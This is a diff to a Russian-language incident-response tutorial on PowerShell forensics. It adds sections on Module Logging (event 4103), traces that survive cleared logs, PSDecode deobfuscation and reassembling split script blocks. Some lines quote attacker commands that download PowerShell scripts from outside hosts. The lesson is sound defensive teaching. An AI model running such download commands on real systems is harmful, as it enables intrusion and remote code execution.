@@ -239,6 +239,56 @@ Invoke-WebRequest http://45.9.148.0/a.ps1 -OutFile a.ps1
 - **Верить, что журнал пуст** — событий нет, если аудит выключен; ищите Prefetch/Sysmon.
 - **Считать `-w hidden` безобидным** — это стелс-флаг.
 
+## Событие 4103: Module Logging
+
+Кроме Script Block Logging (4104) есть Module Logging (4103) — он пишет, какие
+командлеты и модули вызывались, с параметрами:
+
+```
+Event ID 4103 — Microsoft-Windows-PowerShell/Operational
+Payload:
+  CommandInvocation(Invoke-WebRequest): "Invoke-WebRequest"
+  ParameterBinding(Invoke-WebRequest): name="Uri"; value="http://10.0.0.5/a.ps1"
+```
+
+Если 4104 выключен, 4103 часто остаётся и показывает параметры вроде `-Uri`,
+`-EncodedCommand`, `-WindowStyle Hidden`.
+
+## Если логирование выключено — что осталось
+
+Атакующие часто чистят `Operational` лог. Тогда копаем глубже:
+
+- `ConsoleHost_history.txt` в профиле пользователя — история команд;
+- транскрипты (`Start-Transcript`) в `Documents\PowerShell_transcript.*`;
+- кэш AMSI-детекций в логе Defender (1116, 1117);
+- `$MFT`/USN — факт запуска `powershell.exe` и с какими аргументами;
+- Sysmon EventID 1 (ProcessCreate) — командная строка процесса.
+
+```
+PS> Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
+    Where-Object Id -eq 4104 | Select-Object -First 5 | Format-List
+```
+
+## Инструмент: PSDecode и обфускация
+
+`PSDecode` (модуль PowerShell) рекурсивно раскрывает обфускацию: `-enc`,
+`FromBase64String`, замену символов, обратный порядок строк.
+
+```
+PS> Invoke-PSDecode -Path .\suspicious.ps1
+PS> Invoke-PSDecode -Content (Get-Content .\suspicious.ps1 -Raw)
+```
+
+После декодирования команда становится читаемой — и по ней видно, куда шёл C2
+и что скачивалось.
+
+## Частая ошибка: доверять только 4104
+
+4104 может быть отключён или обрезан по размеру (лимит на длину скрипта).
+Тогда одну и ту же команду собирают из нескольких 4104-событий по времени и
+`ScriptBlockId`, а недостающие куски ищут в 4103 и Sysmon. Складывать команду
+из обрывков — обычная практика при разборе PowerShell-атак.
+
 ## Квиз
 
 Проверь себя.
